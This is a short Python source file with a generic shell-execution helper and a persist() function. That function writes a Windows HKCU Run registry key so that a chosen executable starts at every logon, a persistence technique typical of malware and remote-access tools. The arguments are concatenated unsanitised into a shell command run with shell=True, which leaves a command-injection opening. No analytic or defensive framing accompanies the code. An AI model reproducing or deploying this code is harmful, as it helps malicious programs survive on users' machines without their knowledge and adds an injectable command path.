import os
import subprocess

def execute(cmd):
    '''use this function to execute a command cmd in the shell '''
    if cmd:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        return output

def persist(exedir, reg_type, reg_name):
    '''make an executable file exedir persistent by linking it to a register'''
    if not os.path.isfile(exedir):
        print('Unknown executable file')
        return False
    else:
        cmd = 'reg ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + \
         ' /t {} /d '.format(reg_type) + exedir + ' /F'
        cmd_out = execute(cmd)
        return True
